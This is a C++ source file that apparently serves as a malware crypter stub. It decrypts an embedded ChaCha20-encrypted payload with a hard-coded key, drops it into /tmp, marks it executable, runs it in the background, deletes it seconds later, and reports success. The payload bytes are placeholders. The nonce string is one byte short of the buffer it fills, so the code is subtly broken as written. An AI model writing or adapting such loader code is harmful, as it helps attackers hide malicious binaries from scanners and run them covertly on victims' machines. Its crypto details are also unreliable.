#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstring>
#include <cstdlib>
#include <cstdint>
#include <random>
#include <ctime>
#include "chacha20.h"

// Polymorphic key and nonce for ChaCha20 (no obfuscation)
const std::string CHACHA_KEY_QvqQY2bZ = "3939080f0f3808313832383939080f0f3808313832383939080f0f38083138";
const std::string CHACHA_NONCE_tHBPa08m = "51b6b7248d425390898eaf";

// Helper function to convert hex string to bytes
void hexToBytes(const std::string& hex, uint8_t* bytes) {
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        bytes[i/2] = (uint8_t)strtol(byteString.c_str(), nullptr, 16);
    }
}

int main() {
    // Embedded encrypted payload (this would be replaced with actual encrypted data)
    std::vector<uint8_t> encryptedPayload = {
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
        0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10
    };
    
    // Convert hex strings to byte arrays
    uint8_t key[32];
    uint8_t nonce[12];
    hexToBytes(CHACHA_KEY_QvqQY2bZ, key);
    hexToBytes(CHACHA_NONCE_tHBPa08m, nonce);
    
    // Decrypt the payload
    std::vector<uint8_t> decryptedPayload(encryptedPayload.size());
    chacha20CtrCrypt(encryptedPayload.data(), decryptedPayload.data(), 
                     encryptedPayload.size(), key, nonce);
    
    // Create temporary file for the decrypted payload
    std::string tempFile = "/tmp/decrypted_payload_";
    tempFile += std::to_string(std::time(nullptr));
    tempFile += ".bin";
    
    // Write decrypted payload to temporary file
    std::ofstream outFile(tempFile, std::ios::binary);
    if (outFile.is_open()) {
        outFile.write(reinterpret_cast<const char*>(decryptedPayload.data()), 
                      decryptedPayload.size());
        outFile.close();
        
        // Make the file executable
        std::string chmodCmd = "chmod +x " + tempFile;
        system(chmodCmd.c_str());
        
        // Execute the decrypted payload
        std::string execCmd = tempFile + " &";
        system(execCmd.c_str());
        
        // Clean up after a short delay
        std::string cleanupCmd = "sleep 2 && rm -f " + tempFile + " &";
        system(cleanupCmd.c_str());
        
        std::cout << "ChaCha20 payload executed successfully!" << std::endl;
    } else {
        std::cerr << "Failed to create temporary file" << std::endl;
        return 1;
    }
    
    return 0;
}